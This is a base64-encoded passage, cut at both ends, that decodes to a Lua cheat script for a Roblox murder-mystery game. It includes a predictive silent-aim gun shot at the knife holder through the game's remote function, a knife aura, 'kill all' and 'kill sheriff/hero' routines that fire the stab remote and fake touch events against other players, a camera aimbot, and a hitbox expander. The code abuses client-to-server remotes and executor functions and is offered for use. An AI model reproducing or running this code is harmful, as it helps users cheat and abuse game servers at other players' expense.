YWN0ZXI6RmluZEZpcnN0Q2hpbGQoIktuaWZlIikpCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGZ1bmN0aW9uIGdldEtuaWZlUGxheWVyKCkKICAgICAgICAgICAgZm9yIF8sIHBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciBhbmQgaGFzS25pZmUocGxheWVyKSBhbmQgcGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHBsYXllcgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICByZXR1cm4gbmlsCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGZ1bmN0aW9uIHNob290QXRLbmlmZVBsYXllcigpCiAgICAgICAgICAgIGxvY2FsIHRhcmdldCA9IGdldEtuaWZlUGxheWVyKCkKICAgICAgICAgICAgaWYgdGFyZ2V0IGFuZCB0YXJnZXQuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFJvb3QgPSBnZXRDaGFyYWN0ZXJSb290UGFydCh0YXJnZXQuQ2hhcmFjdGVyKQogICAgICAgICAgICAgICAgbG9jYWwgb3JpZ2luUm9vdCA9IGdldENoYXJhY3RlclJvb3RQYXJ0KExvY2FsUGxheWVyLkNoYXJhY3RlcikKICAgICAgICAgICAgICAgIGlmIG5vdCB0YXJnZXRSb290IG9yIG5vdCBvcmlnaW5Sb290IHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIGRpc3RhbmNlID0gKG9yaWdpblJvb3QuUG9zaXRpb24gLSB0YXJnZXRSb290LlBvc2l0aW9uKS5NYWduaXR1ZGUKICAgICAgICAgICAgICAgIGxvY2FsIHZlbG9jaXR5ID0gdGFyZ2V0Um9vdC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5CiAgICAgICAgICAgICAgICBsb2NhbCBkaXJlY3Rpb24gPSB0YXJnZXRSb290LkNGcmFtZS5Mb29rVmVjdG9yCgogICAgICAgICAgICAgICAgbG9jYWwgcHJlZGljdGlvblRpbWUgPSBtYXRoLmNsYW1wKGRpc3RhbmNlIC8gMTAwLCAwLjA1LCAwLjE4KQogICAgICAgICAgICAgICAgbG9jYWwgcHJlZGljdGVkUG9zaXRpb24gPSB0YXJnZXRSb290LlBvc2l0aW9uCiAgICAgICAgICAgICAgICAgICAgKyB2ZWxvY2l0eSAqIHByZWRpY3Rpb25UaW1lCiAgICAgICAgICAgICAgICAgICAgKyBkaXJlY3Rpb24gKiAoMi4yICogcHJlZGljdGlvblRpbWUpCgogICAgICAgICAgICAgICAgcHJlZGljdGVkUG9zaXRpb24gPSB0YXJnZXRSb290LlBvc2l0aW9uOkxlcnAocHJlZGljdGVkUG9zaXRpb24sIDAuNSkKCiAgICAgICAgICAgICAgICBpZiBwcmVkaWN0ZWRQb3NpdGlvbi5ZIDwgdGFyZ2V0Um9vdC5Qb3NpdGlvbi5ZIHRoZW4KICAgICAgICAgICAgICAgICAgICBwcmVkaWN0ZWRQb3NpdGlvbiA9IFZlY3RvcjMubmV3KHByZWRpY3RlZFBvc2l0aW9uLlgsIHRhcmdldFJvb3QuUG9zaXRpb24uWSwgcHJlZGljdGVkUG9zaXRpb24uWikKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICAgICAgWzFdID0gMSwKICAgICAgICAgICAgICAgICAgICBbMl0gPSBwcmVkaWN0ZWRQb3NpdGlvbiwKICAgICAgICAgICAgICAgICAgICBbM10gPSAiQUgyIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGxvY2FsIGd1biA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJHdW4iKQogICAgICAgICAgICAgICAgaWYgZ3VuIGFuZCBndW46RmluZEZpcnN0Q2hpbGQoIktuaWZlTG9jYWwiKSBhbmQgZ3VuLktuaWZlTG9jYWw6RmluZEZpcnN0Q2hpbGQoIkNyZWF0ZUJlYW0iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ3VuLktuaWZlTG9jYWwuQ3JlYXRlQmVhbS5SZW1vdGVGdW5jdGlvbjpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBidXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIEVxdWlwR3VuQW5kRGV0ZWN0R3Vuc2hvdCgpIHRoZW4KICAgICAgICAgICAgICAgIGZvciBpID0gMSwgMTEgZG8KICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgd2Fybigic2hvb3QiKQogICAgICAgICAgICAgICAgICAgICAgICBzaG9vdEF0S25pZmVQbGF5ZXIoKQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlCiAgICAgICAgaWYgY29yZUd1aTpGaW5kRmlyc3RDaGlsZCgiU2hvb3RNdXJkZXJlckd1aSIpIHRoZW4KICAgICAgICAgICAgY29yZUd1aS5TaG9vdE11cmRlcmVyR3VpOkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEsICJib3TDs24gc2hvb3QgRHJhZ2dhYmxlIiwgInBvZGVyIGRlc2xpemFyIGVsIGJvdMOzbiBvIG5vIiwgZnVuY3Rpb24oKQogICAgcmV0dXJuIGdldGdlbnYoKS5zYXZlZENvbmZpZy5idXR0b25EcmFnZ2FibGUgb3IgZmFsc2UKZW5kLCBmdW5jdGlvbihzdGF0ZSkKICAgIGlmIGJ1dHRvbiB0aGVuCiAgICAgICAgYnV0dG9uLkRyYWdnYWJsZSA9IHN0YXRlCiAgICAgICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLmJ1dHRvbkRyYWdnYWJsZSA9IHN0YXRlCiAgICAgICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQogICAgZW5kCmVuZCkKCkxpYnJhcnkuYWRkU2xpZGVyKHRhYjEsICJTaG9vdCBCdXR0b24gU2l6ZSIsICIiLCAxMCwgMzAwLCBnZXRnZW52KCkuc2F2ZWRDb25maWcuYnV0dG9uU2l6ZSBvciAxMzAsIGZ1bmN0aW9uKHNpemUpCiAgICBsb2NhbCBhc3BlY3RSYXRpbyA9IDEwMCAvIDEzMAogICAgaWYgYnV0dG9uIHRoZW4KICAgICAgICBidXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLCBzaXplLCAwLCBzaXplICogYXNwZWN0UmF0aW8pCiAgICAgICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLmJ1dHRvblNpemUgPSBzaXplCiAgICAgICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQogICAgZW5kCmVuZCkKCkxpYnJhcnkuYWRkU2xpZGVyKHRhYjEsICJTaG9vdCBCdXR0b24gVHJhbnNwYXJlbmN5IiwgIiIsIDEsIDksIGdldGdlbnYoKS5zYXZlZENvbmZpZy5idXR0b25UcmFuc3BhcmVuY3kgb3IgNywgZnVuY3Rpb24odHJhbnNwYXJlbmN5KQogICAgaWYgYnV0dG9uIHRoZW4KICAgICAgICBidXR0b24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IHRyYW5zcGFyZW5jeQogICAgICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5idXR0b25UcmFuc3BhcmVuY3kgPSB0cmFuc3BhcmVuY3kKICAgICAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCiAgICBlbmQKZW5kKQoKTGlicmFyeS5hZGRCdXR0b24odGFiMSwgIlJlbW92ZSBCdXR0b24iLCAiZGVzdHJ1aXIgZWwgYm90w7NuIiwgZnVuY3Rpb24oKQogICAgaWYgYnV0dG9uIHRoZW4KICAgICAgICBidXR0b246RGVzdHJveSgpCiAgICAgICAgYnV0dG9uID0gbmlsCiAgICAgICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLmJ1dHRvblJlbW92ZWQgPSB0cnVlCiAgICAgICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQogICAgZW5kCmVuZCkKCkxpYnJhcnkuYWRkTGFiZWwodGFiMSwgIkZvciBNdXJkZXJlciIpCgpsb2NhbCBQbHI9Z2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgUlM9Z2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKCmdldGdlbnYoKS5rYU9uPWZhbHNlCmdldGdlbnYoKS5rYURpc3Q9NwpnZXRnZW52KCkua2FTeXM9ZmFsc2UKZ2V0Z2VudigpLmthQ29uPW5pbAoKTGlicmFyeS5hZGRUb2dnbGUodGFiMSwiS25pZmUgYXVyYSIsIiIsZmFsc2UsZnVuY3Rpb24ocykKICAgIGdldGdlbnYoKS5rYU9uPXMKICAgIGlmIHMgYW5kIG5vdCBnZXRnZW52KCkua2FDb24gdGhlbgogICAgICAgIGxvY2FsIHQ9MAogICAgICAgIGdldGdlbnYoKS5rYUNvbj1SUy5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbihkKQogICAgICAgICAgICB0Kz1kCiAgICAgICAgICAgIGlmIHQ8MC4zIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICB0PTAKICAgICAgICAgICAgbG9jYWwgbHA9UGxyLkxvY2FsUGxheWVyCiAgICAgICAgICAgIGxvY2FsIGM9bHAuQ2hhcmFjdGVyCiAgICAgICAgICAgIGlmIG5vdCBjIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICBsb2NhbCBocnA9YzpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGxvY2FsIGg9YzpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgaWYgbm90IGhycCBvciBub3QgaCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgbG9jYWwga2I9bHAuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIktuaWZlIikKICAgICAgICAgICAgbG9jYWwga2M9YzpGaW5kRmlyc3RDaGlsZCgiS25pZmUiKQogICAgICAgICAgICBsb2NhbCBmb3VuZD1mYWxzZQogICAgICAgICAgICBmb3IgXyxwIGluIGlwYWlycyhQbHI6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICAgICAgaWYgcH49bHAgYW5kIHAuQ2hhcmFjdGVyIGFuZCBwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiAocC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbi1ocnAuUG9zaXRpb24pLk1hZ25pdHVkZTw9Z2V0Z2VudigpLmthRGlzdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZvdW5kPXRydWUKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgZm91bmQgdGhlbgogICAgICAgICAgICAgICAgaWYga2IgYW5kIG5vdCBrYyB0aGVuCiAgICAgICAgICAgICAgICAgICAgaDpFcXVpcFRvb2woa2IpCiAgICAgICAgICAgICAgICAgICAgZ2V0Z2VudigpLmthU3lzPXRydWUKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlaWYga2MgYW5kIGdldGdlbnYoKS5rYVN5cyB0aGVuCiAgICAgICAgICAgICAgICBrYy5QYXJlbnQ9bHAuQmFja3BhY2sKICAgICAgICAgICAgICAgIGdldGdlbnYoKS5rYVN5cz1mYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlaWYgbm90IHMgYW5kIGdldGdlbnYoKS5rYUNvbiB0aGVuCiAgICAgICAgZ2V0Z2VudigpLmthQ29uOkRpc2Nvbm5lY3QoKQogICAgICAgIGdldGdlbnYoKS5rYUNvbj1uaWwKICAgIGVuZAplbmQpCgpMaWJyYXJ5LmFkZFNsaWRlcih0YWIxLCJLbmlmZSBhdXJhIGRldGVjdGlvbiBkaXN0YW5jZSIsIiIsNiwxMCwxLGZ1bmN0aW9uKHYpCiAgICBnZXRnZW52KCkua2FEaXN0PXYKZW5kKQoKZ2V0Z2VudigpLmFrID0gZmFsc2UKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEsICJhdXRvIEtpbGwgYWxsIChCZSBhIG11cmRlcmVyKSIsICJBdXRvIG1hdGFyIGEgdG9kb3MgKHNlciBhc2VzaW5vKSIsIGZhbHNlLCBmdW5jdGlvbihzKQogICAgZ2V0Z2VudigpLmFrID0gcwogICAgaWYgcyB0aGVuCiAgICAgICAgd2hpbGUgZ2V0Z2VudigpLmFrIGRvCiAgICAgICAgICAgIGxvY2FsIGxwID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgIGxvY2FsIGNoID0gbHAuQ2hhcmFjdGVyCiAgICAgICAgICAgIGxvY2FsIGsgPSBjaCBhbmQgY2g6RmluZEZpcnN0Q2hpbGQoIktuaWZlIikKICAgICAgICAgICAgbG9jYWwgaCA9IGsgYW5kIGs6RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpCiAgICAgICAgICAgIGxvY2FsIGUgPSBrIGFuZCBrOkZpbmRGaXJzdENoaWxkKCJTdGFiIikKCiAgICAgICAgICAgIGlmIGUgYW5kIGggdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIHAgaW4gaXBhaXJzKGdhbWUuUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGdldGdlbnYoKS5hayB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIHAgfj0gbHAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0ID0gcC5DaGFyYWN0ZXIgYW5kIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlOkZpcmVTZXJ2ZXIoIlNsYXNoIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHQsIGgsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh0LCBoLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpMaWJyYXJ5LmFkZEJ1dHRvbih0YWIxLCAiS2lsbCBhbGwgKGJlIG11cmRlcmVyKSAiLCAiTWF0YXIgYSB0b2RvcyAoc2VyIG11cmRlcmVyKSIsIGZ1bmN0aW9uKCkKbG9jYWwgYSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBiID0gYS5DaGFyYWN0ZXIgb3IgYS5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKbG9jYWwgYyA9IGE6RmluZEZpcnN0Q2hpbGQoIkJhY2twYWNrIikKCmxvY2FsIGQgPSBiOkZpbmRGaXJzdENoaWxkKCJLbmlmZSIpIG9yIChjIGFuZCBjOkZpbmRGaXJzdENoaWxkKCJLbmlmZSIpKQoKaWYgZCBhbmQgZC5QYXJlbnQgPT0gYyB0aGVuCiAgICBkLlBhcmVudCA9IGIKICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBkLlBhcmVudCA9PSBiCmVuZAoKaWYgZCBhbmQgZC5QYXJlbnQgPT0gYiB0aGVuCiAgICBsb2NhbCBlID0gZDpGaW5kRmlyc3RDaGlsZCgiU3RhYiIpCiAgICAKICAgIGlmIGUgdGhlbgogICAgICAgIGZvciBfLCBmIGluIGlwYWlycyhnYW1lLlBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICBpZiBmIH49IGEgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgZyA9IGYuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBsb2NhbCBoID0gZyBhbmQgZzpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgogICAgICAgICAgICAgICAgaWYgaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZTpGaXJlU2VydmVyKCJTbGFzaCIpCiAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QoaCwgZC5IYW5kbGUsIDEpCiAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QoaCwgZC5IYW5kbGUsIDApCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCmVuZCkKCkxpYnJhcnkuYWRkQnV0dG9uKHRhYjEsICJLaWxsIFNoZXJpZmYvSGVybyAoYmUgbXVyZGVyZXIpICIsICJNYXRhciBhIFNoZXJpZmYvSGVybyAoc2VyIG11cmRlcmVyKSIsIGZ1bmN0aW9uKCkKbG9jYWwgYSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBiID0gYS5DaGFyYWN0ZXIgb3IgYS5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKbG9jYWwgYyA9IGE6RmluZEZpcnN0Q2hpbGQoIkJhY2twYWNrIikKbG9jYWwgZCA9IGI6RmluZEZpcnN0Q2hpbGQoIktuaWZlIikgb3IgKGMgYW5kIGM6RmluZEZpcnN0Q2hpbGQoIktuaWZlIikpCmlmIGQgYW5kIGQuUGFyZW50ID09IGMgdGhlbgogICAgZC5QYXJlbnQgPSBiCiAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgZC5QYXJlbnQgPT0gYgplbmQKCmlmIGQgYW5kIGQuUGFyZW50ID09IGIgdGhlbgogICAgbG9jYWwgZSA9IGQ6RmluZEZpcnN0Q2hpbGQoIlN0YWIiKQogICAgaWYgZSB0aGVuCiAgICAgICAgZm9yIF8sIGYgaW4gaXBhaXJzKGdhbWUuUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgIGlmIGYgfj0gYSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBnID0gZi5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGxvY2FsIGggPSBmOkZpbmRGaXJzdENoaWxkKCJCYWNrcGFjayIpCiAgICAgICAgICAgICAgICBsb2NhbCBpID0gKGcgYW5kIGc6RmluZEZpcnN0Q2hpbGQoIkd1biIpKSBvciAKICAgICAgICAgICAgICAgICAgICAgICAgICAoaCBhbmQgaDpGaW5kRmlyc3RDaGlsZCgiR3VuIikpCiAgICAgICAgICAgICAgICBpZiBpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBqID0gZyBhbmQgZzpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgaWYgaiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGU6RmlyZVNlcnZlcigiU2xhc2giKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChqLCBkLkhhbmRsZSwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QoaiwgZC5IYW5kbGUsIDApCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCmVuZCkKIApMaWJyYXJ5LmFkZExhYmVsKHRhYjEsICJDYW0gYWltYm90IikKTGlicmFyeS5hZGRUb2dnbGUodGFiMSwgIkNhbSBBaW1ib3QgbXVyZGVyZXIiLCAiQWltYm90IGFsIGFzZXNpbm8iLCBmYWxzZSwgZnVuY3Rpb24oYSkKICAgIGdldGdlbnYoKS5hYiA9IGEKZW5kKQoKbG9jYWwgcnMsIHBscnMsIHJlcCA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKSwgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCmxvY2FsIGxwLCBjYW0gPSBwbHJzLkxvY2FsUGxheWVyLCB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQoKcnMuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGlmIG5vdCBnZXRnZW52KCkuYWIgdGhlbiByZXR1cm4gZW5kICAgIAogICAgbG9jYWwgdGd0ID0gbmlsCiAgICBsb2NhbCBkYXRhID0gcmVwOkZpbmRGaXJzdENoaWxkKCJHZXRQbGF5ZXJEYXRhIiwgdHJ1ZSk6SW52b2tlU2VydmVyKCkKCiAgICBmb3IgbmFtZSwgaW5mbyBpbiBwYWlycyhkYXRhIG9yIHt9KSBkbwogICAgICAgIGlmIGluZm8uUm9sZSA9PSAiTXVyZGVyZXIiIGFuZCBuYW1lIH49IGxwLk5hbWUgdGhlbgogICAgICAgICAgICB0Z3QgPSBwbHJzOkZpbmRGaXJzdENoaWxkKG5hbWUpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBpZiB0Z3QgYW5kIHRndC5DaGFyYWN0ZXIgdGhlbgogICAgICAgIGxvY2FsIHJvb3QgPSB0Z3QuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBpZiByb290IHRoZW4KICAgICAgICAgICAgbG9jYWwgZGlyID0gKGxwLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uIC0gcm9vdC5Qb3NpdGlvbikuVW5pdAogICAgICAgICAgICBsb2NhbCBhaW1Qb3MgPSByb290LlBvc2l0aW9uICsgcm9vdC5DRnJhbWUuTG9va1ZlY3RvciAqIDMKICAgICAgICAgICAgY2FtLkNGcmFtZSA9IENGcmFtZS5uZXcoY2FtLkNGcmFtZS5Qb3NpdGlvbiwgYWltUG9zKQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjEsICJEb2RnZSBUaHJvdyBrbmlmZSIsICJFc3F1aXZhciBjdWNoaWxsbyBsYW56YWRvIiwgZmFsc2UsIGZ1bmN0aW9uKHN0YXRlKQoKZW5kKQoKTGlicmFyeS5hZGRTZWN0aW9uKHRhYjIsICJIaXRib3ggRXhwYW5kZXIiKQoKbG9jYWwgZyA9IGdldGdlbnYoKQpnLmhiID0gZmFsc2UKZy5wID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKZy5scCA9IGcucC5Mb2NhbFBsYXllcgpnLnJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKCmcuY2ZnID0gewogICAgc3ogPSBWZWN0b3IzLm5ldygxMCwgMTAsIDEwKSwKICAgIGNvbCA9IENvbG9yMy5mcm9tUkdCKDE2OSwgMTY5LCAxNjkpLAogICAgbWF0ID0gRW51bS5NYXRlcmlhbC5QbGFzdGljLAogICAgY29sbGkgPSBmYWxzZSwKICAgIHRyYSA9IDUsCiAgICBkZWZzeiA9IFZlY3RvcjMubmV3KDIsIDIsIDEpLAogICAgZGVmY29sID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksCiAgICBkZWZtYXQgPSBFbnVtLk1hdGVyaWFsLlNtb290aFBsYXN0aWMsCiAgICBkZWZjb2xsaSA9IHRydWUsCiAgICBkZWZ0cmEgPSAxLAp9CgpnLmdldENoYXIgPSBmdW5jdGlvbihwbHIpCiAgICByZXBlYXQgd2FpdCgpIHVudGlsIHBsci5DaGFyYWN0ZXIKICAgIHJldHVybiBwbHIuQ2hhcmFjdGVyCmVuZAoKZy5hcHBseSA9IGZ1bmN0aW9uKHBscikKICAgIGxvY2FsIGNoYXIgPSBnLmdldENoYXIocGxyKQogICAgaWYgbm90IGNoYXIgdGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCBycCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgaWYgbm90IHJwIHRoZW4gcmV0dXJuIGVuZAoKICAgIGlmIGcuaGIgdGhlbgogICAgICAgIHJwLlNpemUgPSBnLmNmZy5zegogICAgICAgIHJwLkNvbG9yID0gZy5jZmcuY29sCiAgICAgICAgcnAuTWF0ZXJpYWwgPSBnLmNmZy5tYXQKICAgICAgICBycC5DYW5Db2xsaWRlID0gZy5jZmcuY29sbGkKICAgICAgICBycC5UcmFuc3BhcmVuY3kgPSBnLmNmZy50cmEgLyAxMAogICAgZWxzZQogICAgICAgIHJwLlNpemUgPSBnLmNmZy5kZWZzegogICAgICAgIHJwLkNvbG9yID0gZy5jZmcuZGVmY29sCiAgICAgICAgcnAuTWF0ZXJpYWwgPSBnLmNmZy5kZWZtYXQKICAgICAgICBycC5DYW5Db2xsaWRlID0gZy5jZmcuZGVmY29sbGkKICAgICAgICBycC5UcmFuc3BhcmVuY3kgPSBnLmNmZy5kZWZ0cmEKICAgIGVuZAplbmQKCmcuc3RhcnQgPSBmdW5jdGlvbigpCiAgICBnLnBhZCA9IGcucC5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBscikKICAgICAgICBpZiBwbHIgfj0gZy5scCB0aGVuIGcuYXBwbHkocGxyKSBlbmQKICAgIGVuZCkKICAgIGcuaGJjID0gZy5ycy5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgaWYgZy5oYiB0aGVuCiAgICAgICAgICAgIGZvciBfLCBwbHIgaW4gaXBhaXJzKGcucDpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBwbHIgfj0gZy5scCB0aGVuIGcuYXBwbHkocGxyKSBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZAoKZy5zdG9wID0gZnVuY3Rpb24oKQogICAgaWYgZy5wYWQgdGhlbiBnLnBhZDpEaXNjb25uZWN0KCkgZy5wYWQgPSBuaWwgZW5kCiAgICBpZiBnLmhiYyB0aGVuIGcuaGJjOkRpc2Nvbm5lY3QoKSBnLmhiYyA9IG5pbCBlbmQKZW5kCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWIyLCAiSGl0Ym94IEV4cGFuZGVyIiwgIiIsIGcuaGIsIGZ1bmN0aW9uKHMpCiAgICBnLmhiID0gcwogICAgaWYgcyB0aGVuCiAgICAgICAgZy5zdGFydCgpCiAgICAgICAgZm9yIF8sIHBsciBpbiBpcGFpcnMoZy5wOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxyIH49IGcubHAgdGhlbiBnLmFwcGx5KHBscikgZW5kCiAgICAgICAgZW5kCiAgICBlbHNlCiAgICAgICAgZy5zdG9wKCkKICAgIGVuZAplbmQpCgpMaWJyYXJ5LmFkZFNsaWRlcih0YWIyLCAiSGl0Ym94IFNpemUiLCAiIiwgMSwgNTAsIDEwLCBmdW5jdGlvbih2KQogICAgZy5jZmcuc3ogPSBWZWN0b3IzLm5ldyh2LCB2LCB2KQplbmQpCgpMaWJyYXJ5LmFkZFNsaWRlcih0YWIyLCAiSGl0Ym94IFRyYW5zcGFyZW5jeSIsICIiLCAxLCAxMCwgOCwgZnVuY3Rpb24odikKICAgIGcuY2ZnLnRyYSA9IHYKZW5kKQoKTGlicmFyeS5hZGRUb2dnbGUodGFiMiwgIkhpdGJveCBDb2xsaXNpb24iLCAiIiwgZy5jZmcuY29sbGksIGZ1bmN0aW9uKHMpCiAgICBnLmNmZy5jb2xsaSA9IHMKZW5kKQoKTGlicmFyeS5hZGREcm9wZG93bih0YWIyLCAiU2VsZWN0IEhpdGJveCBNYXRlcmlhbCIsICJQbGFzdGljIiwgewogICAgIlBsYXN0aWMiLCAiU21vb3RoUGxhc3RpYyIsICJHbGFzcyIsICJOZW9uIiwgIldvb2QiLCAiQ29ycm9kZWRNZXRhbCIsCiAgICAiRm9yY2VGaWVsZCIsICJTbGF0ZSIsICJEaWFtb25kUGxhdGUiLCAiR3Jhbml0ZSIsICJNYXJibGUiLCAiQ29iYmxlc3RvbmUiLCAiV29vZGVuUGxhbmtzIgp9LCBmdW5jdGlvbih2KQogICA